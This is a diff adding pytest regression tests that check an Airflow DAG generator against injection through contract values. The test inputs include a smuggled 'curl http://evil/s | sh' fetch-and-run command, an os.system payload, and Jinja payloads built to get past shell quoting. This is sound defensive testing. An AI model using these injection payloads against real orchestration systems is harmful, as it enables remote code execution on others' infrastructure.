@@ -32,6 +32,7 @@ present, survives only as inert string data.
 from __future__ import annotations
 
 import ast
+import shlex
 
 import pytest
 
@@ -288,3 +289,340 @@ def test_benign_contract_still_produces_expected_operators():
     assert "load = SnowflakeOperator(" in code
     assert "sql='SELECT 1'" in code
     assert "task_id='load'" in code
+
+
+# ---------------------------------------------------------------------------
+# AirflowDAGGenerator (runtimes/airflow_provider_actions.py)
+#
+# This generator builds a ``BashOperator`` per providerAction. Every task
+# generator previously interpolated contract values straight into
+# ``bash_command="{command}"`` inside an f-string, so a quote in any of them
+# closed the Python literal and put the rest of the value at module scope --
+# executed by Airflow at DAG-parse time. The ``builds[].script`` vector
+# (``scheduleTask``) was the sharpest: it is passed through verbatim by design.
+# ---------------------------------------------------------------------------
+
+
+def _dag_from_actions(provider_actions):
+    from fluid_build.runtimes.airflow_provider_actions import AirflowDAGGenerator
+
+    contract = {
+        "id": "test.product.v1",
+        "kind": "DataProduct",
+        "fluidVersion": "0.7.5",
+        "providerActions": provider_actions,
+    }
+    return AirflowDAGGenerator().generate_dag(contract)
+
+
+@pytest.mark.parametrize(
+    "action,params",
+    [
+        ("scheduleTask", {"engine": "dbt", "script": POC_SQUOTE, "buildId": "b1"}),
+        ("scheduleTask", {"engine": "sql", "script": POC_SQL, "buildId": "b1"}),
+        ("scheduleTask", {"engine": "spark", "script": POC_SQUOTE, "buildId": "b1"}),
+        ("scheduleTask", {"engine": "dbt", "script": "", "buildId": POC_SQUOTE}),
+        ("provisionDataset", {"exposeId": POC_SQUOTE}),
+        ("grantAccess", {"principal": POC_SQUOTE, "role": "viewer", "exposeId": "e1"}),
+        ("grantAccess", {"principal": "p", "role": POC_SQL, "exposeId": "e1"}),
+        ("registerSchema", {"schemaName": POC_SQUOTE}),
+        ("createView", {"viewName": POC_SQUOTE}),
+        ("custom", {"customAction": POC_SQUOTE}),
+    ],
+)
+def test_provider_action_dag_is_injection_safe(action, params):
+    """Every params vector must survive only as inert string data."""
+    assert_inert(_dag_from_actions([{"actionId": "a1", "action": action, "params": params}]))
+
+
+def test_provision_task_gcp_location_is_injection_safe():
+    """``binding.location.project``/``dataset`` reach the bq command line."""
+    assert_inert(
+        _dag_from_actions(
+            [
+                {
+                    "actionId": "a1",
+                    "action": "provisionDataset",
+                    "provider": "gcp",
+                    "params": {
+                        "exposeId": "e1",
+                        "binding": {"location": {"project": POC_SQUOTE, "dataset": POC_SQL}},
+                    },
+                }
+            ]
+        )
+    )
+
+
+def test_action_id_and_depends_on_are_sanitised_identifiers():
+    """``actionId`` becomes a Python variable name on both the definition and
+    the ``a >> b`` dependency wiring -- a newline there is a statement."""
+    assert_inert(
+        _dag_from_actions(
+            [
+                {"actionId": POC_IDENT, "action": "registerSchema", "params": {"schemaName": "s"}},
+                {
+                    "actionId": "a2",
+                    "action": "createView",
+                    "params": {"viewName": "v"},
+                    "dependsOn": [POC_IDENT],
+                },
+            ]
+        )
+    )
+
+
+def test_description_comment_cannot_escape_into_code():
+    """``description`` renders into a ``#`` comment, which a newline ends."""
+    assert_inert(
+        _dag_from_actions(
+            [
+                {
+                    "actionId": "a1",
+                    "action": "custom",
+                    "description": "do a thing\nimport os; os.system('touch /tmp/PWNED4')",
+                    "params": {},
+                }
+            ]
+        )
+    )
+
+
+def test_schedule_task_emits_select_not_models():
+    """``--models`` warns on dbt-core 1.10 and is a hard error on dbt v2."""
+    code = _dag_from_actions(
+        [
+            {
+                "actionId": "a1",
+                "action": "scheduleTask",
+                "params": {"engine": "dbt", "script": "my_model", "buildId": "b1"},
+            }
+        ]
+    )
+    assert "--select" in code
+    assert "--models" not in code
+
+
+def test_benign_provider_action_dag_still_renders_operators():
+    """The escaping must not break the happy path."""
+    code = _dag_from_actions(
+        [
+            {
+                "actionId": "build-orders",
+                "action": "scheduleTask",
+                "params": {"engine": "dbt", "script": "orders", "buildId": "b1"},
+            }
+        ]
+    )
+    tree = assert_inert(code)
+    assert "BashOperator" in code
+    assert "build_orders = BashOperator" in code
+    assert isinstance(tree, ast.Module)
+
+
+# ---------------------------------------------------------------------------
+# The DAG *header* is a second surface: dag_id, description, schedule, kind and
+# domain are all contract-derived and land in `DAG(...)` kwargs and a
+# triple-quoted docstring.
+# ---------------------------------------------------------------------------
+
+
+def _dag_from_contract(**contract_overrides):
+    from fluid_build.runtimes.airflow_provider_actions import AirflowDAGGenerator
+
+    contract = {
+        "id": "test.product.v1",
+        "kind": "DataProduct",
+        "fluidVersion": "0.7.5",
+        "providerActions": [
+            {"actionId": "a1", "action": "registerSchema", "params": {"schemaName": "s"}}
+        ],
+    }
+    contract.update(contract_overrides)
+    return AirflowDAGGenerator().generate_dag(contract)
+
+
+@pytest.mark.parametrize(
+    "overrides",
+    [
+        {"id": POC_SQUOTE},
+        {"description": POC_SQL},
+        {"description": POC_SQUOTE},
+        {"orchestration": {"schedule": POC_SQUOTE}},
+        {"kind": POC_SQUOTE},
+        {"domain": POC_SQUOTE},
+        {"name": POC_SQL},
+    ],
+)
+def test_dag_header_is_injection_safe(overrides):
+    assert_inert(_dag_from_contract(**overrides))
+
+
+def test_empty_dag_header_is_injection_safe():
+    """The no-actions placeholder DAG renders dag_id/schedule too."""
+    from fluid_build.runtimes.airflow_provider_actions import AirflowDAGGenerator
+
+    code = AirflowDAGGenerator().generate_dag(
+        {"id": POC_SQUOTE, "kind": "DataProduct", "fluidVersion": "0.7.5"}
+    )
+    assert_inert(code)
+
+
+def test_schedule_task_script_is_shell_quoted_not_just_python_inert():
+    """`assert_inert` only proves the value cannot escape the *Python* literal.
+
+    The shell layer is separate: the string inside `bash_command` is handed to
+    a shell at task runtime, so a `;` in `script` must not start a new command.
+    """
+    import ast
+
+    code = _dag_from_actions(
+        [
+            {
+                "actionId": "a1",
+                "action": "scheduleTask",
+                "params": {
+                    "engine": "spark",
+                    "script": "job.py; curl http://evil/s | sh",
+                    "buildId": "b1",
+                },
+            }
+        ]
+    )
+    tree = assert_inert(code)
+    commands = [
+        kw.value.value
+        for node in ast.walk(tree)
+        if isinstance(node, ast.Call)
+        for kw in node.keywords
+        if kw.arg == "bash_command" and isinstance(kw.value, ast.Constant)
+    ]
+    assert commands, "no bash_command found"
+    # shlex.quote wraps the whole value, so the `;` is inside quotes.
+    assert commands[0] == "'job.py; curl http://evil/s | sh'", commands[0]
+
+
+# ---------------------------------------------------------------------------
+# The RUNTIME layer. `bash_command` is an Airflow `template_field`, so Airflow
+# re-renders it as Jinja at TASK runtime -- after generation-time quoting is
+# baked in. `shlex.quote` does nothing to `{{ ... }}`, and Jinja string escapes
+# can synthesise a quote from a payload containing none, escaping the quoting.
+# `assert_inert` cannot see this: it only parses the generated Python.
+# ---------------------------------------------------------------------------
+
+#: Renders to a bare `'` without containing one, so shlex.quote has nothing
+#: to escape. This is the payload that defeats quoting-only defences.
+POC_JINJA_QUOTE = '{{ "\\x27" }}; touch /tmp/FLUID_PWNED; #'
+
+#: Same attack, but the delimiters are SPLICED: a single non-overlapping
+#: `re.sub` pass that removes two-character Jinja delimiters rejoins the
+#: survivors into new ones -- `{}}{` -> `{{` and `}{{}` -> `}}` -- so the
+#: payload arrives at the shell with live Jinja. This defeats a
+#: delimiter-matching strip; only stripping braces themselves survives it.
+POC_JINJA_SPLICED = '{}}{ "\\x27" }{{}; touch /tmp/FLUID_PWNED; #'
+
+
+def _bash_commands(code):
+    """Every `bash_command=` value in the generated DAG, as Python sees it."""
+    return [
+        kw.value.value
+        for node in ast.walk(ast.parse(code))
+        if isinstance(node, ast.Call)
+        for kw in node.keywords
+        if kw.arg == "bash_command" and isinstance(kw.value, ast.Constant)
+    ]
+
+
+def _render_like_airflow(command: str) -> str:
+    """Render as Airflow does, with a hostile DAG object in context."""
+    sandbox = pytest.importorskip("jinja2.sandbox")
+
+    class _Dag:
+        description = "'; touch /tmp/FLUID_PWNED_VIA_DAG; #"
+        dag_id = "d"
+
+    class _Var:
+        """Stands in for Airflow's `var.value.<key>` accessor."""
+
+        value = type("V", (), {"__getattr__": lambda self, k: "resolved-" + k})()
+
+    env = sandbox.SandboxedEnvironment()
+    return env.from_string(command).render(dag=_Dag(), var=_Var())
+
+
+@pytest.mark.parametrize(
+    "params",
+    [
+        {"exposeId": POC_JINJA_QUOTE},
+        {"exposeId": "e", "binding": {"location": {"project": POC_JINJA_QUOTE, "dataset": "d"}}},
+        {"exposeId": "e", "binding": {"location": {"project": "p", "dataset": POC_JINJA_QUOTE}}},
+        {"exposeId": "{{ dag.description }}"},
+        # Spliced variants -- these pass against a brace strip and FAIL
+        # against a delimiter-matching strip.
+        {"exposeId": POC_JINJA_SPLICED},
+        {"exposeId": "e", "binding": {"location": {"project": POC_JINJA_SPLICED, "dataset": "d"}}},
+        {"exposeId": "e", "binding": {"location": {"project": "p", "dataset": POC_JINJA_SPLICED}}},
+    ],
+)
+def test_contract_value_cannot_inject_via_runtime_jinja_render(params):
+    """After Airflow's render, the shell must still see one inert token."""
+    code = _dag_from_actions(
+        [{"actionId": "a1", "action": "provisionDataset", "provider": "gcp", "params": params}]
+    )
+    for command in _bash_commands(code):
+        rendered = _render_like_airflow(command)
+        # The payload must not have escaped into a second shell command.
+        assert "touch /tmp/FLUID_PWNED" not in shlex.split(rendered), rendered
+        for token in shlex.split(rendered):
+            assert not token.startswith("touch"), f"escaped the quoting: {rendered}"
+
+
+def test_schedule_task_script_cannot_inject_via_runtime_jinja_render():
+    code = _dag_from_actions(
+        [
+            {
+                "actionId": "a1",
+                "action": "scheduleTask",
+                "params": {"engine": "dbt", "script": POC_JINJA_QUOTE, "buildId": "b1"},
+            }
+        ]
+    )
+    for command in _bash_commands(code):
+        rendered = _render_like_airflow(command)
+        assert shlex.split(rendered)[:3] == ["dbt", "run", "--select"], rendered
+        assert len(shlex.split(rendered)) == 4, f"escaped the quoting: {rendered}"
+
+
+def test_generator_authored_jinja_defaults_still_render():
+    """The fix must not break the generator's own `{{ var.value.* }}`."""
+    code = _dag_from_actions(
+        [{"actionId": "a1", "action": "provisionDataset", "provider": "gcp", "params": {}}]
+    )
+    assert any("var.value.gcp_project" in c for c in _bash_commands(code))
+
+
+@pytest.mark.parametrize("payload", [POC_JINJA_QUOTE, POC_JINJA_SPLICED])
+@pytest.mark.parametrize(
+    "action,params_key",
+    [
+        ("registerSchema", "schemaName"),
+        ("createView", "viewName"),
+        ("grantAccess", "principal"),
+        ("grantAccess", "role"),
+        ("scheduleTask", "buildId"),
+        ("scheduleTask", "script"),
+    ],
+)
+def test_every_bash_command_site_resists_runtime_jinja(action, params_key, payload):
+    """Every command-building branch, both payload shapes.
+
+    `scheduleTask`+`buildId` covers the else-branch that once used bare
+    `shlex.quote` instead of `_sh`; the spliced payload covers the
+    delimiter-rejoin bypass.
+    """
+    params = {"engine": "python", params_key: payload}
+    code = _dag_from_actions([{"actionId": "a1", "action": action, "params": params}])
+    for command in _bash_commands(code):
+        rendered = _render_like_airflow(command)
+        for token in shlex.split(rendered):
+            assert not token.startswith("touch"), f"escaped the quoting: {rendered}"
